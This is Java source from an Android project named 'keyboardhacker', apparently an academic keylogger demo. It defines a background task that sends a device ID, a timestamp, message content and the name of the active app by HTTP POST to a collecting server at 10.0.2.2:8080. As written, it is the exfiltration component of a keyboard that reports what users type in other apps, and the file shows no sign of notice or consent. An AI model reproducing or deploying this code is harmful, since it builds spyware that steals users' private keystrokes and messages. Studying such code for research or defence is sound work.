package edu.cmu.keyboardhacker.simplekeyboard;

import android.os.AsyncTask;
import android.os.SystemClock;

import org.json.JSONObject;

import java.io.BufferedOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

/**
 * Created by helunwen on 11/23/16.
 */
public class MessagService extends AsyncTask<Void, Void, Void> {

    private String deviceId;

    private String timestamp;

    private String message;

    private String applicaitonName;

    private String url = "http://10.0.2.2:8080/api/messages/add";

    private HttpURLConnection httpURLConnection;

    public MessagService(String deviceId, String timestamp, String message, String applicaitonName) {
        this.deviceId = deviceId;
        this.timestamp = timestamp;
        this.message = message;
        this.applicaitonName = applicaitonName;
    }

    @Override
    protected Void doInBackground(Void... params) {
        try {
            URL url = new URL(this.url);
            this.httpURLConnection = (HttpURLConnection) url.openConnection();
            this.httpURLConnection.setDoOutput(true);
            this.httpURLConnection.setChunkedStreamingMode(0);
            this.httpURLConnection.setRequestMethod("POST");
            this.httpURLConnection.setRequestProperty("async", "true");
            this.httpURLConnection.setRequestProperty("crossDomain", "true");
            this.httpURLConnection.setRequestProperty("content-type", "application/x-www-form-urlencoded");
            this.httpURLConnection.setRequestProperty("cache-control", "no-cache");
            String parms = String.format("deviceId=%s&messageTime=%s&content=%s&appName=%s",
                    URLEncoder.encode(this.deviceId, "UTF-8"),
                    URLEncoder.encode(this.timestamp, "UTF-8"),
                    URLEncoder.encode(this.message, "UTF-8"),
                    URLEncoder.encode(this.applicaitonName, "UTF-8"));
            OutputStream output = new BufferedOutputStream(this.httpURLConnection.getOutputStream());
            output.write(parms.toString().getBytes());
            output.flush();
            System.out.println(String.format("Message sent: %s\n", params));
            System.out.println(String.format("Respond code %d, response message %s\n", this.httpURLConnection.getResponseCode(), this.httpURLConnection.getResponseMessage()));
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            this.httpURLConnection.disconnect();
        }
        return null;
    }

}

